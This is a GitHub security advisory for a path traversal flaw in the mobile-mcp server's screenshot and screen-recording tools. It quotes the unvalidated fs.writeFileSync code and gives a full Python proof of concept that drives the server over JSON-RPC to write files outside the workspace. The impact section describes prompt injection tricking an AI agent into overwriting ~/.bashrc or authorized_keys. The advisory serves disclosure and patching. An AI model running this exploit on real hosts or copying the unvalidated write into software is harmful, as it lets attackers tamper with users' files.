# [H] @mobilenext/mobile-mcp alllows arbitrary file write via Path Traversal in mobile screen capture tools

## Summary
Severity: High
Advisory: GHSA-3p2m-h2v6-g9mx
CVE: CVE-2026-33989
CWE: CWE-22, CWE-73
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H (CVSS_V3)
Published: 2026-03-27
Source: https://github.com/advisories/GHSA-3p2m-h2v6-g9mx
Type: github-advisory

## Affected
- npm: `@mobilenext/mobile-mcp` — affected >=0 <0.0.49

## Details
### Summary
The `@mobilenext/mobile-mcp` server contains a Path Traversal vulnerability in the `mobile_save_screenshot` and `mobile_start_screen_recording` tools. The `saveTo` and `output` parameters were passed directly to filesystem operations without validation, allowing an attacker to write files outside the intended workspace.

### Details
**File:** `src/server.ts` (lines 584-592)

```typescript
tool(
    "mobile_save_screenshot",
    "Save Screenshot",
    "Save a screenshot of the mobile device to a file",
    {
        device: z.string().describe("The device identifier..."),
        saveTo: z.string().describe("The path to save the screenshot to"),
    },
    { destructiveHint: true },
    async ({ device, saveTo }) => {
        const robot = getRobotFromDevice(device);
        const screenshot = await robot.getScreenshot();
        fs.writeFileSync(saveTo, screenshot); // ← VULNERABLE: No path validation
        return `Screenshot saved to: ${saveTo}`;
    },
);
```

### Root Cause

The `saveTo` parameter is passed directly to `fs.writeFileSync()` without any validation. The codebase has validation functions for other parameters (`validatePackageName`, `validateLocale` in `src/utils.ts`) but **no path validation function exists**.

### Additional Affected Tool

**File:** `src/server.ts` (lines 597-620)

The `mobile_start_screen_recording` tool has the same vulnerability in its `output` parameter.

### PoC
```py
#!/usr/bin/env python3

import json
import os
import subprocess
import sys
import time
from datetime import datetime

SERVER_CMD = ["npx", "-y", "@mobilenext/mobile-mcp@latest"]
STARTUP_DELAY = 4
REQUEST_DELAY = 0.5


def log(level, msg):
    print(f"[{level.upper()}] {msg}")


def send_jsonrpc(proc, msg, timeout=REQUEST_DELAY):
    """Send JSON-RPC message and receive response."""
    try:
        proc.stdin.write(json.dumps(msg) + "\n")
        proc.stdin.flush()
        time.sleep(timeout)
        line = proc.stdout.readline()
        return json.loads(line) if line else None
    except Exception as e:
        log("error", f"Communication error: {e}")
        return None


def send_notification(proc, method, params=None):
    """Send JSON-RPC notification (no response expected)."""
    msg = {"jsonrpc": "2.0", "method": method}
    if params:
        msg["params"] = params
    proc.stdin.write(json.dumps(msg) + "\n")
    proc.stdin.flush()


def start_server():
    """Start the mobile-mcp server."""
    log("info", "Starting mobile-mcp server...")

    try:
        proc = subprocess.Popen(
            SERVER_CMD,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        time.sleep(STARTUP_DELAY)

        if proc.poll() is not None:
            stderr = proc.stderr.read()
            log("error", f"Server failed to start: {stderr[:200]}")
            return None

        log("info", f"Server started (PID: {proc.pid})")
        return proc

    except FileNotFoundError:
        log("error", "npx not found. Please install Node.js")
        return None


def initialize_session(proc):
    """Initialize MCP session with handshake."""
    log("info", "Initializing MCP session...")

    resp = send_jsonrpc(
        proc,
        {
            "jsonrpc": "2.0",
            "id": 1,
            "method": "initialize",
            "params": {
                "protocolVersion": "2024-11-05",
                "capabilities": {},
                "clientInfo": {"name": "mcpsec-exploit", "version": "1.0"},
            },
        },
    )

    if not resp or "error" in resp:
        log("error", f"Initialize failed: {resp}")
        return False

    send_notification(proc, "notifications/initialized")
    time.sleep(0.5)

    server_info = resp.get("result", {}).get("serverInfo", {})
    log("info", f"Session initialized - Server: {server_info.get('name')} v{server_info.get('version')}")
    return True


def get_devices(proc):
    """Get list of connected devices."""
    log("info", "Enumerating connected devices...")

    resp = send_jsonrpc(
        proc,
        {
            "jsonrpc": "2.0",
            "id": 2,
            "method": "tools/call",
            "params": {"name": "mobile_list_available_devices", "arguments": {}},
        },
    )

    if resp:
        content = resp.get("result", {}).get("content", [{}])[0].get("text", "")
        try:
            devices = json.loads(content).get("devices", [])
            return devices
        except:
            log("warning", f"Could not parse device list: {content[:100]}")

    return []


def exploit_path_traversal(proc, device_id, target_path):
    """Execute path traversal exploit."""
    log("info", f"Target path: {target_path}")

    resp = send_jsonrpc(
        proc,
        {
            "jsonrpc": "2.0",
            "id": 100,
            "method": "tools/call",
            "params": {
                "name": "mobile_save_screenshot",
                "arguments": {"device": device_id, "saveTo": target_path},
            },
        },
        timeout=2,
    )

    if resp:
        content = resp.get("result", {}).get("content", [{}])
        if isinstance(content, list) and content:
            text = content[0].get("text", "")
            log("info", f"Server response: {text[:100]}")

            check_path = target_path
            if target_path.startswith(".."):
                check_path = os.path.normpath(os.path.join(os.getcwd(), target_path))

            if os.path.exists(check_path):
                size = os.path.getsize(check_path)
                log("info", f"FILE WRITTEN: {check_path} ({size} bytes)")
                return True, check_path, size
            elif "Screenshot saved" in text:
                log("info", f"Server confirmed write (file may be at relative path)")
                return True, target_path, 0

    log("warning", "Exploit may have failed or file not accessible")
    return False, target_path, 0


def main():
    device_id = sys.argv[1] if len(sys.argv) > 1 else None

    proc = start_server()
    if not proc:
        sys.exit(1)

    try:
        if not initialize_session(proc):
            sys.exit(1)

        if not device_id:
            devices = get_devices(proc)
            if devices:
                log("info", f"Found {len(devices)} device(s):")
                for d in devices:
                    print(f"  - {d.get('id')} - {d.get('name')} ({d.get('platform')}, {d.get('state')})")
                device_id = devices[0].get("id")
                log("info", f"Using device: {device_id}")
            else:
                log("error", "No devices found. Please connect a device and try again.")
                log("info", "Usage: python3 exploit.py <device_id>")
                sys.exit(1)

        home = os.path.expanduser("~")

        exploits = [
            "../../exploit_2_traversal.png",
            f"{home}/exploit.png",
            f"{home}/.poc_dotfile",
        ]

        results = []
        for target in exploits:
            success, path, size = exploit_path_traversal(proc, device_id, target)
            results.append((target, success, path, size))

    finally:
        proc.terminate()
        log("info", "Server terminated.")


if __name__ == "__main__":
    main()
```

### Impact
A Prompt Injection attack from a malicious website or document could trick the AI into overwriting sensitive host files (e.g., `~/.bashrc`, `~/.ssh/authorized_keys`, or `.config` files) leading to a broken shell.

## References
- https://github.com/mobile-next/mobile-mcp/security/advisories/GHSA-3p2m-h2v6-g9mx
- https://nvd.nist.gov/vuln/detail/CVE-2026-33989
- https://github.com/mobile-next/mobile-mcp/commit/f5e32295903128c1e71cf915ae6c0b76c7b0153b
- https://github.com/mobile-next/mobile-mcp
- https://github.com/mobile-next/mobile-mcp/releases/tag/0.0.49
